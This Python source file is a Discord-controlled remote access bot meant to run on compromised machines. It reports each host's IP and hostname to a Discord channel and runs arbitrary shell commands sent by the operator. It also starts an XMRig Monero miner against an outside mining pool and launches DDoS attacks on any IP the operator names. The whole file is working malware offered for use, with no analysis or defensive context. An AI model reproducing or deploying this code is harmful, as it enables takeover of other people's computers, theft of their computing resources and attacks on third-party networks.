from discord.ext import commands
import requests, discord, psutil, socket, sys, os

token = 'MToken.mnt.discord' # Token
channel_id = 111111111111111111  # Channel ID

# bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')

# client
ip = requests.get('https://sheesh.rip/ip').headers['IP']
hostname = socket.gethostname()
os.chdir("/tmp")

# login
@bot.event
async def on_ready():
    channel = bot.get_channel(channel_id)
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ip))
    print(f'{bot.user}')
    await channel.send(f"``[+] {ip}@{hostname}: Session opened``")


# ----- Bot Commands ----- #

# sessions
@bot.command()
async def sessions(ctx):
    await ctx.send(f"``[*] {ip}@{hostname}``")

# exit
@bot.command()
async def exit(ctx):
    await ctx.send(f"``[-] {ip}@{hostname}: Session closed``")
    sys.exit()

# shell
@bot.command()
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
    
    if sys.getsizeof(output) > 2000:
        await ctx.send(f"``[+] {ip}@{hostname}: Command executed``")
    else:
        await ctx.send(f"``[+] {ip}@{hostname}: Command executed`` ```{output}```")

# check
@bot.command()
async def check(ctx):
    if "xmrig" in (i.name() for i in psutil.process_iter()):
        await ctx.send(f"``[+] {ip}@{hostname}: Miner running``")
    else:
        await ctx.send(f"``[-] {ip}@{hostname}: Miner not running``")

# ddos
@bot.command()
async def ddos(ctx, ddosarg):
    ddosip = ''.join(ddosarg)
    os.popen(f"chmod +x storm & ./storm -d {ddosip}")
    await ctx.send(f"``[+] {ip}@{hostname}: DDoS started to {ddosip}``")

# stop ddos
@bot.command()
async def stopddos(ctx):
    if "storm" in (i.name() for i in psutil.process_iter()):
        os.popen("pkill storm")
        await ctx.send(f"``[-] {ip}@{hostname}: DDoS stoped``")

# miner
@bot.command()
async def miner(ctx, walletArg):
    wallet = ''.join(walletArg)
    os.popen(f"./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
    await ctx.send(f"``[+] {ip}@{hostname}: Miner started``")

# stop miner
@bot.command()
async def stopminer(ctx):
    if "xmrig" in (i.name() for i in psutil.process_iter()):
        os.popen("pkill xmrig")
        await ctx.send(f"``[-] {ip}@{hostname}: Miner stoped``")


bot.run(token)
